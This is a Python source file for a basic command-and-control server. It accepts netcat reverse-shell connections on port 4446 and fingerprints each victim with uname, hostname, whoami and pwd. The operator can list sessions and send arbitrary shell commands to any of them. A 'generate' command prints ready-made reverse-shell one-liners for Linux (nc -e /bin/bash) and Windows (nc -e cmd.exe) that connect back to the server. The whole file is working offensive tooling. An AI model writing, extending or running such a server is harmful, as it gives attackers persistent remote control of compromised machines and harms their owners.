import socket
import sys
import threading
import uuid

from typing import Dict


class C2Session:
    def __init__(self, session_id: str, socket: socket.socket, session_type: str) -> None:
        self.session_id: int = None
        self.socket: socket.socket = None
        self.session_type: str = None
        self.os: str = None
        self.hostname: str = None
        self.address: str = None
        self.user: str = None
        self.pwd: str = None

        self.set_session_id(session_id)
        self.set_socket(socket)
        self.set_type(session_type)

        self.get_system_info()

    def close(self) -> None:
        self.socket.close()

    def set_session_id(self, session_id: int) -> None:
        self.session_id = session_id

    def get_session_id(self) -> int:
        return self.session_id

    def set_socket(self, socket: socket.socket) -> None:
        self.socket = socket

    def get_socket(self) -> socket.socket:
        return self.socket

    def set_type(self, session_type: str) -> None:
        self.session_type = session_type

    def get_type(self) -> str:
        return self.session_type

    def set_os(self, os: str) -> None:
        self.os = os

    def get_os(self) -> str:
        return self.os

    def set_hostname(self, hostname: str) -> None:
        self.hostname = hostname

    def get_hostname(self) -> str:
        return self.hostname

    def set_address(self, address: str) -> None:
        self.address = address

    def get_address(self) -> str:
        return self.address

    def set_user(self, user: str) -> None:
        self.user = user

    def get_user(self) -> str:
        return self.user

    def set_pwd(self, pwd: str) -> None:
        self.pwd = pwd

    def get_pwd(self) -> str:
        return self.pwd

    def is_alive(self) -> bool:
        try:
            self.socket.sendall(b"")
            return True
        except:
            return False

    def get_system_info(self) -> None:
        try:
            self.set_os(self.exec_cmd("uname -s"))
            self.set_hostname(self.exec_cmd("hostname"))
            self.set_user(self.exec_cmd("whoami"))
            self.set_pwd(self.exec_cmd("pwd"))
        except:
            print("Error getting system info")

    def exec_cmd(self, cmd: str) -> str:
        try:
            command = f'{cmd}'
            self.get_socket().sendall(command.encode('utf-8') + b"\n")
            data = self.socket.recv(1024).decode()
            if data:
                return data.strip()
            else:
                return "unknown"
        except:
            return "unknown"

    def __str__(self) -> str:
        return f"     {self.get_session_id()} --> {self.get_address()[0]} - {self.get_user()}@{self.get_hostname()} - ({self.get_os()}/{self.get_type()}) - alive={self.is_alive()}"


class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 4446):
        self.host = host
        self.port = port
        self.sessions: Dict[str, C2Session] = {}
        self.nc_listener = None

    # Start the listeners
    def start(self) -> None:
        try:
            # Start the netcat listener
            self.nc_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.nc_listener.bind((self.host, self.port))
            self.nc_listener.listen(0)

            # Print the server information
            print(f"C2 Server {socket.gethostname()} version 1.0 started on {self.host}:{self.port}")
            print(f"Netcat listener started on port {self.port}")
        except Exception as e:
            print(f"Error starting server: {e}")
            sys.exit(1)

    # Accept incoming connections
    def accept_connections(self) -> None:
        # Loop to accept incoming connections
        while True:

            # Accept incoming Netcat connections
            try:
                client_socket, client_address = self.nc_listener.accept()
                session_id = str(uuid.uuid4())[:8]
                temp_session = C2Session(session_id, client_socket, "netcat")
                temp_session.set_address(client_address)

                self.sessions[session_id] = temp_session
                print(f"New session created: {session_id} - {client_address[0]} (Netcat)")
                threading.Thread(target=self.handle_session, args=(session_id,)).start()
            except KeyboardInterrupt:
                print("\nExiting gracefully...")
                sys.exit(0)
            except Exception as e:
                print(f"Error accepting netcat connection: {e}")

    @staticmethod
    def handle_session(session_id: str) -> None:
        while True:
            try:
                continue
            except KeyboardInterrupt:
                print("\nExiting gracefully...")
                sys.exit(0)
            except Exception as e:
                print(f"Error handling session {session_id}: {e}")
                break

    def process_results(self, session_id: str) -> None:
        session = self.sessions[session_id]
        try:
            pass
            data = session.get_socket().recv(1024).decode()
            if not data:
                print(f"Session {session_id} disconnected.")
                return
            response_lines = data.split('\n')
            for line in response_lines:
                print(f"{line}")
        except Exception as e:
            print(f"Error handling session {session_id}: {e}")

    def main_loop(self) -> None:
        try:
            while True:
                command = input("C2 Server > ")
                if command == "exit":
                    break
                elif command == "help":
                    print("Commands:")
                    print("list - List all active sessions")
                    print("interact <session_id> - Interact with a session")
                    print("generate <os> <conn_type> - Generate a command for the reverse shell")
                    print("exit - Exit the server")
                elif command == "list":
                    print("Sessions:")
                    for session_id, session in self.sessions.items():
                        print(str(session))
                elif command.startswith("interact ") or command.startswith("use "):
                    parts = command.split()
                    if len(parts) == 2:
                        session_id = parts[1]
                        if session_id in self.sessions:
                            self.interact_session(session_id)
                        else:
                            print("Invalid session ID")
                    else:
                        print("Usage: interact <session_id>")
                elif command.startswith("generate ") or command.startswith("gen "):
                    parts = command.split()
                    if len(parts) == 3:
                        os = parts[1]
                        conn_type = parts[2]
                        print(self.generate_command(os, conn_type))
                    else:
                        print("Usage: generate <os>")
                else:
                    print("Invalid command. Type 'help' for a list of commands.")
        except KeyboardInterrupt:
            print("\nExiting gracefully...")
            sys.exit(0)

    def interact_session(self, session_id: str) -> None:
        session = self.sessions[session_id]
        session_type = session.get_type()

        if session_type == "netcat":
            self.interact_nc(session_id)
        else:
            print(f"Unknown session type: {session_type}")

    @staticmethod
    def is_empty_or_whitespace(s: str) -> bool:
        return s is None or len(s.strip()) == 0

    def interact_nc(self, session_id: str) -> None:
        session = self.sessions[session_id]
        print(f"Interacting with session {session_id} (Netcat). Type 'back' to return to the main prompt.")
        while True:
            try:
                command = input(f"Session {session_id} > ")
                if command == "back":
                    break
                elif self.is_empty_or_whitespace(command):
                    continue
                command = f'{command}'  # Wrap command in quotes
                session.get_socket().sendall(command.encode('utf-8') + b"\n")
                self.process_results(session_id)
            except KeyboardInterrupt:
                print("\nExiting session...")
                break
            except Exception as e:
                print(f"Error interacting with session {session_id}: {e}")

    def generate_command(self, os: str, connection_type: str) -> str:
        if os.lower() == "linux":
            if connection_type.lower() == "nc":
                return f"netcat command for {os}: nc -nv {self.host} {self.port} -e /bin/bash"
            else:
                return "Invalid connection type. Please specify 'nc' for Netcat or 'ssh' for SSH."
        elif os.lower() == "windows":
            if connection_type.lower() == "nc":
                return f"netcat command for {os}: nc -nv {self.host} {self.port} -e cmd.exe"
            else:
                return "Invalid connection type. Please specify 'nc' for Netcat."
        else:
            return "Unsupported OS. Please specify 'linux' or 'windows'."


def main():
    c2_server = C2Server()
    c2_server.start()
    threading.Thread(target=c2_server.accept_connections).start()
    c2_server.main_loop()


if __name__ == "__main__":
    main()